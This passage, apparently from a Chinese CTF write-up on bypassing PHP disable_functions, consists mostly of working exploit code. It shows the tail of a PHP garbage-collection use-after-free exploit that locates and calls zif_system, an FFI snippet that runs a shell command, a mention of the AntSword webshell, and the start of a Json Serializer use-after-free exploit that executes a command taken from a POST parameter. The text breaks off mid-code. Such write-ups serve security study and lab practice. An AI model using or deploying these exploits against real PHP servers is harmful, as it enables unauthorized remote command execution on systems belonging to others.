$i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/ctfhub/2.png" alt=""></p><h1 id="FFI-扩展"><a href="#FFI-扩展" class="headerlink" title="FFI 扩展"></a>FFI 扩展</h1><p>FFI扩展<br>php&gt;7.4，开启了FFI扩展ffi.enable=true，我们可以通过FFI来调用C中的system进而达到执行命令的目的<br><a href="https://www.laruence.com/2020/03/11/5475.html" target="_blank" rel="noopener">https://www.laruence.com/2020/03/11/5475.html</a>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ffi = FFI::cdef(<span class="string">"int system(const char *command);"</span>);</span><br><span class="line">$ffi-&gt;system(<span class="string">"/readflag &gt; /tmp/123"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/tmp/123"</span>);</span><br><span class="line">@unlink(<span class="string">"/tmp/123"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用蚁剑<br><img src="../../images/ctf/ctfhub/6.jpg" alt=""></p><h1 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h1><p>利用json序列化中的堆溢出触发，借以绕过disable_function，影响范围是:<br>7.1 – all versions to date<br>7.2 &lt; 7.2.19 (released: 30 May 2019)<br>7.3 &lt; 7.3.6 (released: 30 May 2019)<br><img src="../../images/ctf/ctfhub/7.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">$cmd = $_POST[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line">$n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $leak;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">      $i = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">        $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">        $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span><span class="params">($addr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $spl1;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">8</span>, $addr - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> strlen(get_class($spl1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $spl1, $fake_tbl_off;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x18</span>, $addr + $p - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        $leak = strlen($spl1::$leak);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = <span class="keyword">$this</span>-&gt;leak2($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = <span class="keyword">$this</span>-&gt;leak2($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = <span class="keyword">$this</span>-&gt;leak2($addr);</span><br><span class="line">            $f_name = <span class="keyword">$this</span>-&gt;leak2($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;leak2($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span 